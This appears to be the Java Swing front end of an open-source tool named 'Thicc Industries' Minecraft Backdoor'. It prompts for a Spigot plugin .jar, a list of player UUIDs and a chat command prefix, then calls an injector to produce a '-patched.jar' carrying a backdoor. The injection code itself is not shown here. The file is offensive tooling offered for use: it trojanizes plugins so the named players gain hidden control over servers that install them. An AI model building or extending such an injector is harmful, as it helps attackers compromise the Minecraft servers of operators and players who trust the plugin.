package com.thiccindustries.backdoor;

import javax.swing.*;
import javax.swing.filechooser.FileFilter;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;

public class InjectorGUI{

    public static void main(String[] args){
        try {
            UIManager.setLookAndFeel(UIManager.getLookAndFeel());
        }catch(Throwable ignored){}

        int result = 999;
        while(result != JOptionPane.YES_OPTION) {
            /*--- Home dialog ---*/
            String[] options = {"Inject", "About", "Close"};
            result = JOptionPane.showOptionDialog(
                    null,
                    "Thicc Industries' Minecraft Backdoor.\n" +
                            "Requirements:\n" +
                            "   * Minecraft UUID\n" +
                            "   * Target plugin .jar file",
                    "Thicc Industries Injector",
                    JOptionPane.YES_NO_CANCEL_OPTION,
                    JOptionPane.PLAIN_MESSAGE,
                    null,       //no custom icon
                    options,        //button titles
                    options[0]      //default button
            );

            if (result == JOptionPane.NO_OPTION) {
                JOptionPane.showMessageDialog(
                        null,
                        "Created by: MajesticWaffle @ Thicc Industries,\n" +
                                "Injector Version: 1.4\n" +
                                "Release Date: June 25 2021\n" +
                                "License: GPL v3.0",
                        "Thicc Industries Injector",
                        JOptionPane.INFORMATION_MESSAGE
                );
            }

            if(result == JOptionPane.CANCEL_OPTION)
                return;
        }

        /*--- Get Files ---*/
        JFileChooser fc = new JFileChooser();
        fc.setFileFilter(new FileFilter() {
            @Override
            public boolean accept(File file) {
                return file.getName().endsWith(".jar") || file.isDirectory();
            }

            @Override
            public String getDescription() {
                return "Spigot Plugin File (*.jar)";
            }
        });

        int result1 = fc.showOpenDialog(null);

        //Out dialog cancelled
        if(result1 != JFileChooser.APPROVE_OPTION)
            return;

        String InPath = fc.getSelectedFile().getPath();

        int sep = InPath.lastIndexOf(".");
        String OutPath = InPath.substring(0, sep) + "-patched.jar";

        /*--- Query options ---*/
        String UUIDList;
        String ChatPrefix;

        UUIDList = (String)JOptionPane.showInputDialog(
                null,
                "Minecraft UUIDs (Separated by commas):",
                "Thicc Industries Injector",
                JOptionPane.PLAIN_MESSAGE,
                null,
                null,
                ""
        );

        //No input
        if(UUIDList.isEmpty())
            return;

        ChatPrefix = (String)JOptionPane.showInputDialog(
                null,
                "Chat Command Prefix:",
                "Thicc Industries Injector",
                JOptionPane.PLAIN_MESSAGE,
                null,
                null,
                "#"
        );

        //No input
        if(ChatPrefix.isEmpty())
            return;

        //Parse uuids

        String[] splitUUID = UUIDList.split(",");

        Injector.SimpleConfig sc = new Injector.SimpleConfig(splitUUID, ChatPrefix);
        boolean result2 = Injector.patchFile(InPath, OutPath, sc);

        if(result2){
            JOptionPane.showMessageDialog(null, "Backdoor injection complete.\nIf this project helped you, considering starring it on GitHub.", "Thicc Industries Injector", JOptionPane.INFORMATION_MESSAGE);
        }else{
            JOptionPane.showMessageDialog(null, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.", "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
        }
    }

    public static void displayError(String message){
        JOptionPane.showMessageDialog(null, message, "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
    }
}
